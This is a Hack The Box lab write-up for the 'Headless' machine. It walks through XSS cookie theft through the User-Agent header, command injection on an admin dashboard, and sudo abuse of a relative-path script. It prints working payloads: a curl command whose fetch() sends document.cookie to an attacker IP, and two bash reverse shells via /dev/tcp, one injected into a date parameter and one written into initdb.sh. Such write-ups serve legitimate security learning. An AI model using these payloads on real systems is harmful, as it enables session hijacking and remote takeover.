---
title: 'Headless'
target: 'Hack The Box — Headless'
difficulty: 'easy'
date: 2025-08-29
summary: 'An HTB machine — discovering a /support form that reflects request headers on a "Hacking Attempt Detected" page, using OWASP ZAP to confirm the is_admin cookie lacks the HttpOnly flag and that XSS payloads in the User-Agent header are reflected, injecting an XSS payload via User-Agent to steal the admin cookie when a headless browser processes the report, using the admin cookie to access /dashboard and exploiting command injection in the date parameter for a reverse shell, then escalating privileges through a sudo-permitted syscheck script that executes a user-controlled initdb.sh.'
role: 'pentest'
tags: ['xss', 'cookie-theft', 'command-injection', 'privilege-escalation', 'owasp-zap', 'steganography', 'reverse-shell', 'sudo', 'headless-browser', 'selenium']
problem: 'Headless is an easy-rated Linux machine running a Python web application on port 5000. The application has a /support form and an admin-only /dashboard endpoint. The is_admin cookie is set without the HttpOnly flag. A headless browser periodically processes submitted support reports, rendering the stored HTML including request headers — creating an XSS vector through the User-Agent header that can exfiltrate the admin cookie.'
action: 'Enumerated the web application at http://10.10.11.8:5000 and found a /support form. Submitting input containing angle brackets or template syntax triggers a "Hacking Attempt Detected" page that reflects the full request headers — including the User-Agent — back to the user. Ran an OWASP ZAP automated scan to map the application and review alerts. ZAP flagged the is_admin cookie as missing the HttpOnly flag (CWE-1004), confirming it could be read by client-side JavaScript. Used ZAP Fuzzer to test XSS Image Tag payloads against the User-Agent header — all payloads came back as Reflected. Crafted an XSS payload in the User-Agent header that fetches the attacker server with document.cookie as a query parameter, submitted the support form with angle brackets in the message body to trigger the hacking attempt report, and caught the admin cookie on a netcat listener when the headless browser rendered the report. Used the stolen admin cookie (ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0) to access /dashboard, exploited command injection in the date parameter via semicolon injection to execute a reverse shell, then escalated from user dvir to root through a syscheck script that runs an attacker-controlled initdb.sh with sudo privileges.'
outcome: 'Gained root access to the machine. The attack chain was XSS cookie theft via User-Agent header injection, command injection on the admin dashboard for initial shell access as dvir, and sudo abuse of syscheck running a user-controlled initdb.sh for privilege escalation to root.'
draft: false
---

## Background

Headless is a Linux machine running a Python web application (Werkzeug/Flask) on port 5000. The box is straightforward but teaches a valuable lesson about where XSS vectors can hide — the vulnerability isn't in the form fields themselves, but in a request header that gets reflected when the application logs a "hacking attempt." The attack chain moves from XSS cookie theft to command injection to sudo abuse, each step building on the access gained from the previous one.

---

## Reconnaissance and the support form

The web application at `http://10.10.11.8:5000` has a homepage titled "Under Construction" and a `/support` form where users can submit their name, email, phone number, and a message. Submitting anything containing angle brackets (`<>`) or template syntax (`{{}}`) in the form fields triggers a **"Hacking Attempt Detected"** response page. This page reflects the full client request information back — method, URL, all headers, and the cookie — ostensibly as part of an incident report sent to administrators.

![Hacking Attempt Detected page showing Client Request Information — POST method to http://10.10.11.8:5000/support with full request headers including Host, User-Agent (Mozilla/5.0 Chrome/124.0.0.0), Accept, Referer, and Cookie is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs.](/writeups/htb-headless/01-hacking-attempt-detected.png)

The critical detail is that the **User-Agent** header is reflected verbatim in the response HTML. If an attacker controls the User-Agent and the application renders this report in a browser context, any JavaScript in that header will execute.

---

## OWASP ZAP — automated scanning and fuzzing

Running an OWASP ZAP automated scan against the target maps the application and identifies security issues.

![OWASP ZAP Automated Scan interface showing URL to attack http://10.10.11.8:5000 with traditional spider enabled, Firefox Headless ajax spider, and Progress showing Attack complete.](/writeups/htb-headless/02-zap-automated-scan.png)

The Alerts tab reveals 11 findings. The most relevant one for the attack path is **Cookie No HttpOnly Flag** — ZAP identifies that the `is_admin` cookie is set without the `HttpOnly` attribute, meaning client-side JavaScript can read it via `document.cookie`. The response headers confirm the cookie value: `Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/`.

![ZAP Alerts panel showing 11 alerts — Cookie No HttpOnly Flag selected with evidence Set-Cookie: is_admin, CWE ID 1004, description explaining that a cookie without HttpOnly can be accessed by JavaScript and transmitted to another site for session hijacking.](/writeups/htb-headless/03-zap-cookie-no-httponly.png)

With the HttpOnly flag missing, stealing the cookie via XSS becomes viable. ZAP's Fuzzer confirms the vector — loading **XSS Image Tag** payloads against the User-Agent header and firing them at the `/support` endpoint shows every payload reflected in the response.

![ZAP Fuzzer setup showing POST request to /support with User-Agent header selected as the fuzz location, Add Payload dialog with File Fuzzers type and XSS Image Tag selected from the payload list showing entries like IMG SRC=javascript:alert and IMG SRC=JaVaScRiPt:alert.](/writeups/htb-headless/04-zap-fuzzer-xss-payloads.png)

![ZAP Fuzzer results showing 25 messages sent with 0 errors, all returning 200 OK with State marked as Reflected — payloads including IMG SRC=javascript:alert, IMG SRC=JaVaScRiPt:alert, navigatorurl:test -chrome, and others all confirmed reflected in the response body.](/writeups/htb-headless/05-zap-fuzzer-reflected.png)

Every XSS Image Tag payload comes back reflected. The User-Agent header is the confirmed injection point.

---

## Cookie theft via XSS

The application saves support form submissions as HTML reports, and a headless browser (Selenium via `inspect_reports.py`, triggered by crontab) periodically loads and processes them. When the report includes the "Hacking Attempt Detected" page — which renders the attacker's User-Agent verbatim — any JavaScript in that header executes in the headless browser's context, which has the **admin's** `is_admin` cookie.

The attack: set the User-Agent header to an XSS payload that exfiltrates `document.cookie`, submit the form with angle brackets in the message body to trigger the hacking attempt report, and listen for the callback.

```bash
curl -X POST http://10.10.11.8:5000/support \
  -H 'User-Agent: <img src=x onerror="fetch(\"http://10.10.14.34:4444/?c=\"+document.cookie)">' \
  -d 'fname=test&lname=test&email=test@test.com&phone=1234567890&message=<>'
```

The netcat listener catches the admin cookie when the headless browser renders the report:

![Terminal showing netcat listener on port 4444 receiving a GET request with the stolen admin cookie — GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 with User-Agent Mozilla/5.0 X11 Linux x86_64 Firefox/115.0, Referer http://localhost:5000, Origin http://localhost:5000.](/writeups/htb-headless/06-netcat-admin-cookie.png)

The admin cookie: `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`. The Referer and Origin headers confirm the request came from `localhost:5000` — the headless browser running on the server itself.

---

## Command injection on the admin dashboard

Setting the `is_admin` cookie to the stolen value grants access to `/dashboard`, which presents an administrative interface with a "Generate Report" function that accepts a date parameter. The date parameter is passed directly to a shell command without sanitisation, allowing command injection via semicolon.

```bash
curl http://10.10.11.8:5000/dashboard \
  -H 'Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0' \
  -d 'date=2023-09-15;/bin/bash -c "bash -i >& /dev/tcp/10.10.14.34/4444 0>&1"'
```

This delivers a reverse shell as user **dvir**.

---

## Privilege escalation — syscheck and initdb.sh

As dvir, `sudo -l` shows that the user can run `/usr/bin/syscheck` as root without a password. Examining the syscheck script reveals that it executes `./initdb.sh` from the current working directory — a classic relative path vulnerability. Writing a malicious `initdb.sh` in dvir's home directory that spawns a root shell, making it executable, and running `sudo /usr/bin/syscheck` from that directory escalates to root.

```bash
echo '#!/bin/bash' > /home/dvir/initdb.sh
echo 'bash -i >& /dev/tcp/10.10.14.34/5555 0>&1' >> /home/dvir/initdb.sh
chmod +x /home/dvir/initdb.sh
cd /home/dvir && sudo /usr/bin/syscheck
```

Root shell received. Both flags were retrieved.

---

## What I took from this

The XSS vector on this box is a good example of why input sanitisation has to cover the entire request, not just the obvious form fields. The application correctly detects and blocks angle brackets in form inputs, but then renders the User-Agent header — which the attacker fully controls — without any escaping. The "Hacking Attempt Detected" page is meant to be a security feature, but it becomes the vulnerability because it reflects unsanitised header data into HTML.

The missing HttpOnly flag on the `is_admin` cookie is what makes the XSS exploitable for session hijacking. With HttpOnly set, `document.cookie` wouldn't return the cookie even if JavaScript executes. ZAP catching this automatically is a reminder that automated scanning, while not sufficient on its own, reliably identifies the low-hanging configuration issues that make more complex attacks possible.

The privilege escalation through syscheck running `./initdb.sh` with a relative path is a textbook example of why scripts executed with elevated privileges should always use absolute paths. The sudo configuration gives dvir unrestricted access to syscheck, and syscheck trusts whatever `initdb.sh` exists in the current directory — so the attacker just writes their own and runs syscheck from the right place.
